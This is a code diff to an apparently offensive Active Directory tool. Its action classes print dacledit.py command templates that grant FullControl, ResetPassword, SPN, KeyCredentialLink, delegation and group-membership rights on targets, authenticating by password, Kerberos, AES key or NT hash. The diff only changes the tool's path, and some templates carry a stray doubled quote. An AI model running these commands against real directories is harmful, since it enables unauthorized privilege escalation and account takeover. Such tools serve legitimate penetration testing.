@@ -113,13 +113,13 @@ class x_DaclFullControl(Action):
         ]
 
         if parent.krb_auth:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights FullControl -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights FullControl -action write"
         elif parent.secret_type == c.SECRET_NTHASH:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights FullControl -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights FullControl -action write"
         elif parent.secret_type == c.SECRET_AESKEY:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights FullControl -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights FullControl -action write"
         elif parent.secret_type == c.SECRET_PASSWORD:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights FullControl -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights FullControl -action write"
 
         print_line(comment, cmd, v)
 
@@ -136,13 +136,13 @@ class x_DaclResetPassword(Action):
         ]
 
         if parent.krb_auth:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights ResetPassword -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights ResetPassword -action write"
         elif parent.secret_type == c.SECRET_NTHASH:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights ResetPassword -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights ResetPassword -action write"
         elif parent.secret_type == c.SECRET_AESKEY:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights ResetPassword -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights ResetPassword -action write"
         elif parent.secret_type == c.SECRET_PASSWORD:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights ResetPassword -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights ResetPassword -action write"
 
         print_line(comment, cmd, v)
 
@@ -159,13 +159,13 @@ class x_DaclUserAccountControl(Action):
         ]
 
         if parent.krb_auth:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid bf967a68-0de6-11d0-a285-00aa003049e2 -mask write -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid bf967a68-0de6-11d0-a285-00aa003049e2 -mask write -action write"
         elif parent.secret_type == c.SECRET_NTHASH:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn ''{parent.obj.dn}' -target '{target.name}' -rights-guid bf967a68-0de6-11d0-a285-00aa003049e2 -mask write -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn ''{parent.obj.dn}' -target '{target.name}' -rights-guid bf967a68-0de6-11d0-a285-00aa003049e2 -mask write -action write"
         elif parent.secret_type == c.SECRET_AESKEY:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn ''{parent.obj.dn}' -target '{target.name}' -rights-guid bf967a68-0de6-11d0-a285-00aa003049e2 -mask write -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn ''{parent.obj.dn}' -target '{target.name}' -rights-guid bf967a68-0de6-11d0-a285-00aa003049e2 -mask write -action write"
         elif parent.secret_type == c.SECRET_PASSWORD:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid bf967a68-0de6-11d0-a285-00aa003049e2 -mask write -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid bf967a68-0de6-11d0-a285-00aa003049e2 -mask write -action write"
 
         print_line(comment, cmd, v)
 
@@ -216,13 +216,13 @@ class x_DaclInitialProgram(Action):
         ]
 
         if parent.krb_auth:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 9201ac6f-1d69-4dfb-802e-d95510109599 -mask write -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 9201ac6f-1d69-4dfb-802e-d95510109599 -mask write -action write"
         elif parent.secret_type == c.SECRET_NTHASH:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn ''{parent.obj.dn}' -target '{target.name}' -rights-guid 9201ac6f-1d69-4dfb-802e-d95510109599 -mask write -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn ''{parent.obj.dn}' -target '{target.name}' -rights-guid 9201ac6f-1d69-4dfb-802e-d95510109599 -mask write -action write"
         elif parent.secret_type == c.SECRET_AESKEY:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn ''{parent.obj.dn}' -target '{target.name}' -rights-guid 9201ac6f-1d69-4dfb-802e-d95510109599 -mask write -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn ''{parent.obj.dn}' -target '{target.name}' -rights-guid 9201ac6f-1d69-4dfb-802e-d95510109599 -mask write -action write"
         elif parent.secret_type == c.SECRET_PASSWORD:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 9201ac6f-1d69-4dfb-802e-d95510109599 -mask write -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 9201ac6f-1d69-4dfb-802e-d95510109599 -mask write -action write"
 
         print_line(comment, cmd, v)
 
@@ -258,13 +258,13 @@ class x_DaclServicePrincipalName(Action):
         ]
 
         if parent.krb_auth:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid f3a64788-5306-11d1-a9c5-0000f80367c1 -mask write -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid f3a64788-5306-11d1-a9c5-0000f80367c1 -mask write -action write"
         elif parent.secret_type == c.SECRET_NTHASH:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid f3a64788-5306-11d1-a9c5-0000f80367c1 -mask write -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid f3a64788-5306-11d1-a9c5-0000f80367c1 -mask write -action write"
         elif parent.secret_type == c.SECRET_AESKEY:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid f3a64788-5306-11d1-a9c5-0000f80367c1 -mask write -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid f3a64788-5306-11d1-a9c5-0000f80367c1 -mask write -action write"
         elif parent.secret_type == c.SECRET_PASSWORD:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid f3a64788-5306-11d1-a9c5-0000f80367c1 -mask write -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid f3a64788-5306-11d1-a9c5-0000f80367c1 -mask write -action write"
 
         print_line(comment, cmd, v)
 
@@ -331,13 +331,13 @@ class x_DaclKeyCredentialLink(Action):
         ]
 
         if parent.krb_auth:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 5b47d60f-6090-40b2-9f37-2a4de88f3063 -mask write -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 5b47d60f-6090-40b2-9f37-2a4de88f3063 -mask write -action write"
         elif parent.secret_type == c.SECRET_NTHASH:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 5b47d60f-6090-40b2-9f37-2a4de88f3063 -mask write -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 5b47d60f-6090-40b2-9f37-2a4de88f3063 -mask write -action write"
         elif parent.secret_type == c.SECRET_AESKEY:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 5b47d60f-6090-40b2-9f37-2a4de88f3063 -mask write -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 5b47d60f-6090-40b2-9f37-2a4de88f3063 -mask write -action write"
         elif parent.secret_type == c.SECRET_PASSWORD:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 5b47d60f-6090-40b2-9f37-2a4de88f3063 -mask write -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 5b47d60f-6090-40b2-9f37-2a4de88f3063 -mask write -action write"
 
         print_line(comment, cmd, v)
 
@@ -384,13 +384,13 @@ class x_DaclMemberShips(Action):
         ]
 
         if parent.krb_auth:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid bf9679c0-0de6-11d0-a285-00aa003049e2 -mask write -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid bf9679c0-0de6-11d0-a285-00aa003049e2 -mask write -action write"
         elif parent.secret_type == c.SECRET_NTHASH:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid bf9679c0-0de6-11d0-a285-00aa003049e2 -mask write -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid bf9679c0-0de6-11d0-a285-00aa003049e2 -mask write -action write"
         elif parent.secret_type == c.SECRET_AESKEY:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid bf9679c0-0de6-11d0-a285-00aa003049e2 -mask write -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid bf9679c0-0de6-11d0-a285-00aa003049e2 -mask write -action write"
         elif parent.secret_type == c.SECRET_PASSWORD:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid bf9679c0-0de6-11d0-a285-00aa003049e2 -mask write -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid bf9679c0-0de6-11d0-a285-00aa003049e2 -mask write -action write"
 
         print_line(comment, cmd, v)
 
@@ -407,13 +407,13 @@ class x_DaclSelf(Action):
         ]
 
         if parent.krb_auth:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights Custom -mask self -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights Custom -mask self -action write"
         elif parent.secret_type == c.SECRET_NTHASH:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights Custom -mask self -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights Custom -mask self -action write"
         elif parent.secret_type == c.SECRET_AESKEY:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights Custom -mask self -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights Custom -mask self -action write"
         elif parent.secret_type == c.SECRET_PASSWORD:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights Custom -mask self -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights Custom -mask self -action write"
 
         print_line(comment, cmd, v)
 
@@ -458,13 +458,13 @@ class x_DaclAllowedToAct(Action):
         ]
 
         if parent.krb_auth:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79 -mask write -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79 -mask write -action write"
         elif parent.secret_type == c.SECRET_NTHASH:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79 -mask write -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79 -mask write -action write"
         elif parent.secret_type == c.SECRET_AESKEY:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79 -mask write -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79 -mask write -action write"
         elif parent.secret_type == c.SECRET_PASSWORD:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79 -mask write -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79 -mask write -action write"
 
         print_line(comment, cmd, v)
 
@@ -481,13 +481,13 @@ class x_DaclAccountRestrictions(Action):
         ]
 
         if parent.krb_auth:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 4c164200-20c0-11d0-a768-00aa006e0529 -mask write -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 4c164200-20c0-11d0-a768-00aa006e0529 -mask write -action write"
         elif parent.secret_type == c.SECRET_NTHASH:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 4c164200-20c0-11d0-a768-00aa006e0529 -mask write -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 4c164200-20c0-11d0-a768-00aa006e0529 -mask write -action write"
         elif parent.secret_type == c.SECRET_AESKEY:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 4c164200-20c0-11d0-a768-00aa006e0529 -mask write -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}' -k -no-pass -aesKey {parent.secret} -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 4c164200-20c0-11d0-a768-00aa006e0529 -mask write -action write"
         elif parent.secret_type == c.SECRET_PASSWORD:
-            cmd = "./tools/dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 4c164200-20c0-11d0-a768-00aa006e0529 -mask write -action write"
+            cmd = "dacledit.py '{fqdn}/{parent.obj.name}:{parent.secret}' -use-ldaps -dc-ip {dc_ip} -principal-dn '{parent.obj.dn}' -target '{target.name}' -rights-guid 4c164200-20c0-11d0-a768-00aa006e0529 -mask write -action write"
 
         print_line(comment, cmd, v)
 
